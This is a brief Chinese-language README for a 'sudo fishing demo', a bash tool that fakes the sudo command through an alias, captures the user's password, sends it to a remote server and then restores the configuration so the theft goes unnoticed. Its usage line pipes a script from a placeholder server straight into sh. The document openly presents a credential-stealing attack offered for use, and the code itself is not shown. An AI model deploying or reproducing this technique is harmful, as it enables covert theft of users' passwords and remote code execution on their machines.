# sudo_fishing_demo

通过alias伪造sudo命令进行钓鱼。用户下一次输入密码时，密码将发送到远端服务器。
纯bash实现，命令行交互完全模型真实情况，成功后自动恢复原配置，Mac下无感。

## Demo
![video](http://static.cdxy.me/sudo%E9%92%93%E9%B1%BCdemo_1.mov)

## Usage
`curl http://your_file_server/find_sh.sh | sh`
